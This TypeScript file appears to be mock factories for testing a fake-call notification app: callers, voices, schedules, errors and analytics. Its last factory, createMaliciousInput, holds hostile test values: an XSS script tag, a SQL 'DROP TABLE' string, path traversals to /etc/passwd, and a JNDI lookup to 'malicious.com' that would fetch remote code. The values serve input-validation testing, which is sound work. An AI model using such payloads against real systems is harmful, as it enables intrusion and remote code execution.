/**
 * Mock Factories for Fake Call Notification System Testing
 * Provides comprehensive test data generation for all fake call scenarios
 */

import {
    CallerInfo,
    VoiceProfile,
    FakeCallConfig,
    CallSchedule,
    CallStateData,
    CallInteraction,
    AudioBufferInfo,
    DeviceInfo,
    NotificationCapabilities,
    CallError,
    CallErrorType,
    VoiceQuality,
    CallMessage,
    FakeCallPreferences,
    ProTierSecurity,
    SubscriptionStatus,
    FeatureLimitStatus,
    SafetyValidation,
    SafeNameDatabase,
    PhoneNumberValidation,
    CallerIDSafety,
    CallAnalytics,
    CallUsageAnalytics,
    FakeCallNotificationType,
    FakeCallResult,
    FakeCallEvent,
    FakeCallEventType
} from '../types';

// ===========================================
// MOCK FACTORIES - CORE DATA STRUCTURES
// ===========================================

export class MockCallerInfoFactory {
    static createSafe(callerType: 'safe' | 'emergency' | 'business' | 'personal' = 'safe'): CallerInfo {
        const firstNames = ['John', 'Jane', 'Mike', 'Sarah', 'David', 'Emily'];
        const lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia'];

        return {
            id: `caller_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
            name: `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`,
            phoneNumber: this.generateSafePhoneNumber(),
            avatarUrl: undefined,
            callerType,
            location: 'New York, NY',
            riskLevel: 'low',
            isVerified: true,
            displayName: callerType === 'emergency' ? 'Emergency Services' : 'John Smith'
        };
    }

    static createEmergency(): CallerInfo {
        return {
            id: 'emergency_911',
            name: 'Emergency Services',
            phoneNumber: '911',
            callerType: 'emergency',
            location: undefined,
            riskLevel: 'low',
            isVerified: true,
            displayName: 'Emergency Services'
        };
    }

    static createBusiness(): CallerInfo {
        return {
            id: 'business_acme',
            name: 'Acme Corporation',
            phoneNumber: '+1-555-ACME-01',
            callerType: 'business',
            location: 'Los Angeles, CA',
            riskLevel: 'low',
            isVerified: true,
            displayName: 'Acme Corp - HR Department'
        };
    }

    private static generateSafePhoneNumber(): string {
        // Generate safe, non-real phone numbers
        const areaCode = Math.floor(Math.random() * 800) + 200; // 200-999
        const exchange = Math.floor(Math.random() * 800) + 200; // 200-999
        const number = Math.floor(Math.random() * 9000) + 1000; // 1000-9999

        return `+1-${areaCode}-${exchange}-${number}`;
    }
}

export class MockVoiceProfileFactory {
    static createDefault(): VoiceProfile {
        return {
            id: 'professional_male',
            name: 'Professional Male',
            language: 'en-US',
            region: 'US',
            gender: 'male',
            ageRange: 'adult',
            accent: 'neutral',
            personality: 'professional',
            quality: 'premium',
            sampleText: 'Hello, this is a professional business call.',
            isAvailable: true,
            fileSize: 2048576
        };
    }

    static createFemale(): VoiceProfile {
        return {
            id: 'professional_female',
            name: 'Professional Female',
            language: 'en-US',
            region: 'US',
            gender: 'female',
            ageRange: 'adult',
            accent: 'neutral',
            personality: 'professional',
            quality: 'premium',
            sampleText: 'Hello, this is Dr. Johnson calling.',
            isAvailable: true,
            fileSize: 2097152
        };
    }

    static createCasual(): VoiceProfile {
        return {
            id: 'casual_male',
            name: 'Casual Male',
            language: 'en-US',
            region: 'US',
            gender: 'male',
            ageRange: 'young',
            accent: 'casual',
            personality: 'casual',
            quality: 'standard',
            sampleText: 'Hey, what\'s up?',
            isAvailable: true,
            fileSize: 1536000
        };
    }

    static createAll(): VoiceProfile[] {
        return [
            this.createDefault(),
            this.createFemale(),
            this.createCasual(),
            {
                id: 'business_female',
                name: 'Business Female',
                language: 'en-GB',
                region: 'UK',
                gender: 'female',
                ageRange: 'mature',
                accent: 'british',
                personality: 'formal',
                quality: 'premium',
                sampleText: 'Good morning, this is Sarah from accounts.',
                isAvailable: true,
                fileSize: 2304000
            }
        ];
    }
}

export class MockFakeCallConfigFactory {
    static createStandard(): FakeCallConfig {
        return {
            callerInfo: MockCallerInfoFactory.createSafe(),
            voiceProfileId: 'professional_male',
            callType: 'incoming' as any,
            priority: 'normal' as any,
            autoAnswer: false,
            callDuration: 30,
            audioMessage: 'Hello, this is a test call. How are you doing today?',
            vibratePattern: [0, 500, 200, 500],
            emergencyOverride: false
        };
    }

    static createBusinessCall(): FakeCallConfig {
        return {
            callerInfo: MockCallerInfoFactory.createBusiness(),
            voiceProfileId: 'business_female',
            callType: 'incoming' as any,
            priority: 'high' as any,
            autoAnswer: true,
            callDuration: 60,
            audioMessage: 'Good morning, this is Sarah from Acme Corporation. I\'m calling about your recent inquiry.',
            customRingtone: 'business_chime',
            vibratePattern: [0, 300, 150, 300, 150, 300],
            emergencyOverride: false
        };
    }

    static createEmergencyCall(): FakeCallConfig {
        return {
            callerInfo: MockCallerInfoFactory.createEmergency(),
            voiceProfileId: 'professional_male',
            callType: 'emergency' as any,
            priority: 'urgent' as any,
            autoAnswer: true,
            callDuration: 120,
            audioMessage: 'This is an emergency services call. Please respond immediately.',
            vibratePattern: [0, 200, 100, 200, 100, 200, 100, 200],
            emergencyOverride: true
        };
    }
}

export class MockCallScheduleFactory {
    static createStandard(): CallSchedule {
        return {
            id: `schedule_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
            userId: 'test_user_123',
            config: MockFakeCallConfigFactory.createStandard(),
            scheduledFor: new Date(Date.now() + 300000), // 5 minutes from now
            timezone: 'America/New_York',
            smartScheduling: {
                enabled: true,
                skipDuringFocus: true,
                skipDuringMeetings: true,
                respectDoNotDisturb: true,
                contextAware: true
            },
            notification: {
                advanceWarning: 5,
                reminderEnabled: true,
                reminderMessage: 'You have a fake call scheduled in 5 minutes'
            }
        };
    }

    static createRecurring(): CallSchedule {
        return {
            id: `schedule_recurring_${Date.now()}`,
            userId: 'test_user_123',
            config: MockFakeCallConfigFactory.createBusinessCall(),
            scheduledFor: new Date(Date.now() + 86400000), // Tomorrow
            timezone: 'America/New_York',
            recurring: {
                type: 'daily',
                interval: 1,
                endDate: new Date(Date.now() + 30 * 86400000), // 30 days
                skipHolidays: true
            },
            smartScheduling: {
                enabled: true,
                skipDuringFocus: false,
                skipDuringMeetings: false,
                respectDoNotDisturb: true,
                contextAware: false
            },
            notification: {
                advanceWarning: 10,
                reminderEnabled: true,
                reminderMessage: 'Daily business call reminder'
            }
        };
    }
}

export class MockCallStateDataFactory {
    static createActive(): CallStateData {
        const config = MockFakeCallConfigFactory.createStandard();
        return {
            callId: `call_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
            userId: 'test_user_123',
            config,
            state: 'active' as any,
            startTime: new Date(),
            duration: 25,
            interactionHistory: [
                {
                    timestamp: new Date(Date.now() - 30000),
                    action: 'answer' as any,
                    userAgent: 'user'
                }
            ],
            metadata: {
                platform: 'ios' as any,
                appVersion: '1.0.0',
                deviceInfo: MockDeviceInfoFactory.createIOS(),
                sessionId: `session_${Date.now()}`
            }
        };
    }

    static createFailed(): CallStateData {
        const config = MockFakeCallConfigFactory.createStandard();
        return {
            callId: `call_failed_${Date.now()}`,
            userId: 'test_user_123',
            config,
            state: 'failed' as any,
            startTime: new Date(),
            duration: 0,
            interactionHistory: [],
            error: MockCallErrorFactory.createAudioError(),
            metadata: {
                platform: 'ios' as any,
                appVersion: '1.0.0',
                deviceInfo: MockDeviceInfoFactory.createIOS(),
                sessionId: `session_${Date.now()}`
            }
        };
    }
}

export class MockDeviceInfoFactory {
    static createIOS(): DeviceInfo {
        return {
            platform: 'ios' as any,
            osVersion: '15.0',
            deviceModel: 'iPhone 13',
            hasCallKit: true,
            hasInCallService: false,
            audioSessionAvailable: true,
            notificationCapabilities: {
                canSchedule: true,
                canBadge: true,
                canSound: true,
                canVibrate: true,
                canCriticalAlerts: true,
                canFullScreenIntent: false
            }
        };
    }

    static createAndroid(): DeviceInfo {
        return {
            platform: 'android' as any,
            osVersion: '12',
            deviceModel: 'Samsung Galaxy S21',
            hasCallKit: false,
            hasInCallService: true,
            audioSessionAvailable: true,
            notificationCapabilities: {
                canSchedule: true,
                canBadge: true,
                canSound: true,
                canVibrate: true,
                canCriticalAlerts: false,
                canFullScreenIntent: true
            }
        };
    }

    static createWeb(): DeviceInfo {
        return {
            platform: 'web' as any,
            osVersion: 'N/A',
            deviceModel: 'Web Browser',
            hasCallKit: false,
            hasInCallService: false,
            audioSessionAvailable: true,
            notificationCapabilities: {
                canSchedule: true,
                canBadge: false,
                canSound: true,
                canVibrate: false,
                canCriticalAlerts: false,
                canFullScreenIntent: false
            }
        };
    }
}

export class MockCallErrorFactory {
    static createAudioError(): CallError {
        return {
            type: CallErrorType.AUDIO_PLAYBACK_ERROR,
            code: 'AUDIO_PLAYBACK_FAILED',
            message: 'Failed to play audio during call',
            details: { audioFormat: 'mp3', error: 'Device not available' },
            recoverable: true,
            suggestedAction: 'Check audio device permissions',
            technicalDetails: { platform: 'ios', audioSessionError: 'Category not set' },
            timestamp: new Date(),
            callId: 'test_call_123',
            userId: 'test_user_123'
        };
    }

    static createVoiceSynthesisError(): CallError {
        return {
            type: CallErrorType.VOICE_SYNTHESIS_FAILED,
            code: 'VOICE_SYNTHESIS_FAILED',
            message: 'Failed to synthesize speech',
            details: { voiceId: 'professional_male', textLength: 150 },
            recoverable: true,
            suggestedAction: 'Check voice availability and permissions',
            technicalDetails: { ttsEngine: 'AVSpeechSynthesizer', error: 'Voice not available' },
            timestamp: new Date(),
            callId: 'test_call_456',
            userId: 'test_user_123'
        };
    }

    static createProTierError(): CallError {
        return {
            type: CallErrorType.PRO_TIER_REQUIRED,
            code: 'PRO_TIER_REQUIRED',
            message: 'Pro tier subscription required for this feature',
            details: { feature: 'fake_calls', userTier: 'free' },
            recoverable: false,
            suggestedAction: 'Upgrade to Pro tier to access fake call features',
            technicalDetails: { subscriptionStatus: 'expired' },
            timestamp: new Date(),
            callId: '',
            userId: 'test_user_123'
        };
    }
}

export class MockAudioBufferInfoFactory {
    static createStandard(): AudioBufferInfo {
        return {
            format: 'mp3',
            sampleRate: 22050,
            channels: 1,
            bitRate: 64000,
            duration: 5.0,
            size: 40960,
            voiceProfileId: 'professional_male',
            quality: 'medium'
        };
    }

    static createHighQuality(): AudioBufferInfo {
        return {
            format: 'wav',
            sampleRate: 44100,
            channels: 2,
            bitRate: 128000,
            duration: 10.0,
            size: 176400,
            voiceProfileId: 'professional_female',
            quality: 'high'
        };
    }
}

export class MockFakeCallPreferencesFactory {
    static createDefault(): FakeCallPreferences {
        return {
            userId: 'test_user_123',
            enabled: true,
            autoAnswer: false,
            defaultCallDuration: 30,
            priority: 'normal' as any,
            defaultVoiceProfile: 'professional_male',
            voiceSpeed: 'normal' as any,
            voiceVolume: 0.7,
            audioQuality: 'medium' as any,
            preferredCallerTypes: ['safe', 'business'],
            allowBusinessCalls: true,
            allowEmergencyCalls: false,
            useRealisticNumbers: true,
            smartScheduling: {
                enabled: true,
                respectFocusMode: true,
                respectMeetings: true,
                respectDoNotDisturb: true
            },
            advanceWarning: 5,
            reminderEnabled: true,
            soundEnabled: true,
            hapticEnabled: true,
            accessibility: {
                screenReaderEnabled: false,
                highContrast: false,
                largeText: false,
                voiceControl: false,
                simplifiedInterface: false
            },
            privacy: {
                logCallHistory: true,
                shareAnalytics: false,
                enableEmergencyOverride: false
            },
            updatedAt: new Date()
        };
    }

    static createAccessibilityOptimized(): FakeCallPreferences {
        const base = this.createDefault();
        return {
            ...base,
            accessibility: {
                screenReaderEnabled: true,
                highContrast: true,
                largeText: true,
                voiceControl: true,
                simplifiedInterface: true
            },
            voiceSpeed: 'slow' as any,
            voiceVolume: 0.9,
            advanceWarning: 10
        };
    }
}

export class MockCallAnalyticsFactory {
    static createStandard(): CallAnalytics {
        return {
            callId: 'test_call_123',
            userId: 'test_user_123',
            callType: 'incoming' as any,
            state: 'ended' as any,
            duration: 45,
            interactions: [
                {
                    timestamp: new Date(Date.now() - 45000),
                    action: 'answer' as any,
                    userAgent: 'user'
                }
            ],
            answerRate: 1.0,
            averageCallDuration: 42,
            mostUsedActions: ['answer' as any, 'end' as any],
            voiceProfileId: 'professional_male',
            synthesisLatency: 150,
            audioQuality: 'medium' as any,
            platform: 'ios' as any,
            callKitUsed: true,
            backgroundAudioUsed: false,
            hapticFeedbackUsed: true,
            scheduledAt: new Date(Date.now() - 300000),
            endedAt: new Date(),
            createdAt: new Date(Date.now() - 310000)
        };
    }

    static createUsageAnalytics(): CallUsageAnalytics {
        return {
            userId: 'test_user_123',
            period: 'monthly' as any,
            startDate: new Date(Date.now() - 30 * 86400000),
            endDate: new Date(),
            totalCalls: 25,
            successfulCalls: 23,
            failedCalls: 2,
            averageDuration: 38,
            mostUsedVoiceProfiles: ['professional_male', 'business_female'],
            mostCommonCallerTypes: ['business', 'safe'],
            preferredCallTimes: ['09:00', '14:00', '17:00'],
            answerRate: 0.92,
            completionRate: 0.88,
            userSatisfactionScore: 4.2,
            featureAdoptionRate: 0.85,
            subscriptionValue: 9.99,
            churnRiskScore: 0.15
        };
    }
}

export class MockSubscriptionStatusFactory {
    static createActivePro(): SubscriptionStatus {
        return {
            isActive: true,
            tier: 'pro' as any,
            expiresAt: new Date(Date.now() + 30 * 86400000),
            autoRenew: true,
            paymentMethod: 'credit_card',
            trialUsed: true,
            gracePeriod: undefined
        };
    }

    static createExpired(): SubscriptionStatus {
        return {
            isActive: false,
            tier: 'free' as any,
            expiresAt: new Date(Date.now() - 7 * 86400000),
            autoRenew: false,
            paymentMethod: 'none',
            trialUsed: false,
            gracePeriod: new Date(Date.now() + 3 * 86400000)
        };
    }
}

export class MockFakeCallEventFactory {
    static createCallStarted(): FakeCallEvent {
        return {
            type: FakeCallEventType.CALL_STARTED,
            data: { callId: 'test_call_123', callerInfo: MockCallerInfoFactory.createSafe() },
            timestamp: new Date(),
            userId: 'test_user_123',
            callId: 'test_call_123'
        };
    }

    static createCallAnswered(): FakeCallEvent {
        return {
            type: FakeCallEventType.CALL_ANSWERED,
            data: { callId: 'test_call_123', interactionDuration: 5 },
            timestamp: new Date(),
            userId: 'test_user_123',
            callId: 'test_call_123'
        };
    }

    static createProTierChanged(): FakeCallEvent {
        return {
            type: FakeCallEventType.PRO_TIER_STATUS_CHANGED,
            data: { oldTier: 'free', newTier: 'pro', expiresAt: new Date(Date.now() + 30 * 86400000) },
            timestamp: new Date(),
            userId: 'test_user_123'
        };
    }
}

// ===========================================
// MOCK SERVICE FACTORIES
// ===========================================

export class MockNotificationService {
    static createSuccessResponse() {
        return {
            success: true,
            data: 'notification_123',
            metadata: {
                timestamp: new Date(),
                requestId: 'req_123',
                duration: 150,
                platform: 'ios' as any
            }
        };
    }

    static createErrorResponse(errorType: string = 'UNKNOWN_ERROR') {
        return {
            success: false,
            error: {
                type: errorType,
                code: 'NOTIFICATION_FAILED',
                message: 'Failed to send notification',
                recoverable: true,
                suggestedAction: 'Check notification permissions',
                timestamp: new Date(),
                callId: 'test_call_123',
                userId: 'test_user_123'
            },
            metadata: {
                timestamp: new Date(),
                requestId: 'req_123',
                duration: 150,
                platform: 'ios' as any
            }
        };
    }
}

export class MockVoiceSynthesisService {
    static createSuccessResponse(audioBuffer?: AudioBufferInfo) {
        return {
            success: true,
            data: audioBuffer || MockAudioBufferInfoFactory.createStandard(),
            metadata: {
                timestamp: new Date(),
                requestId: 'req_123',
                duration: 200,
                platform: 'ios' as any
            }
        };
    }

    static createErrorResponse(errorType: CallErrorType = CallErrorType.VOICE_SYNTHESIS_FAILED) {
        return {
            success: false,
            error: {
                type: errorType,
                code: 'VOICE_SYNTHESIS_FAILED',
                message: 'Failed to synthesize speech',
                recoverable: true,
                suggestedAction: 'Check voice availability',
                timestamp: new Date(),
                callId: 'test_call_123',
                userId: 'test_user_123'
            },
            metadata: {
                timestamp: new Date(),
                requestId: 'req_123',
                duration: 200,
                platform: 'ios' as any
            }
        };
    }
}

export class MockCallerIDService {
    static createSuccessResponse(callerInfo?: CallerInfo) {
        return {
            success: true,
            data: callerInfo || MockCallerInfoFactory.createSafe(),
            metadata: {
                timestamp: new Date(),
                requestId: 'req_123',
                duration: 100,
                platform: 'ios' as any
            }
        };
    }

    static createErrorResponse(errorType: CallErrorType = CallErrorType.INVALID_CALLER_ID) {
        return {
            success: false,
            error: {
                type: errorType,
                code: 'CALLER_ID_GENERATION_FAILED',
                message: 'Failed to generate caller ID',
                recoverable: true,
                suggestedAction: 'Check caller ID service',
                timestamp: new Date(),
                callId: 'test_call_123',
                userId: 'test_user_123'
            },
            metadata: {
                timestamp: new Date(),
                requestId: 'req_123',
                duration: 100,
                platform: 'ios' as any
            }
        };
    }
}

// ===========================================
// PERFORMANCE AND STRESS TEST FACTORIES
// ===========================================

export class MockStressTestFactory {
    static createMultipleCalls(count: number = 10): CallStateData[] {
        return Array.from({ length: count }, (_, index) => ({
            callId: `stress_call_${index}_${Date.now()}`,
            userId: 'stress_test_user',
            config: MockFakeCallConfigFactory.createStandard(),
            state: 'active' as any,
            startTime: new Date(),
            duration: 30,
            interactionHistory: [],
            metadata: {
                platform: 'ios' as any,
                appVersion: '1.0.0',
                deviceInfo: MockDeviceInfoFactory.createIOS(),
                sessionId: `session_${index}_${Date.now()}`
            }
        }));
    }

    static createLargeTextForSynthesis(length: number = 10000): string {
        return 'This is a test message. '.repeat(Math.ceil(length / 22));
    }

    static createMaliciousInput(): any {
        return {
            callerInfo: {
                name: '<script>alert("xss")</script>',
                phoneNumber: 'DROP TABLE users;',
                displayName: '../../../etc/passwd'
            },
            audioMessage: '${jndi:ldap://malicious.com/a}',
            customRingtone: '../../../sensitive/file'
        };
    }
}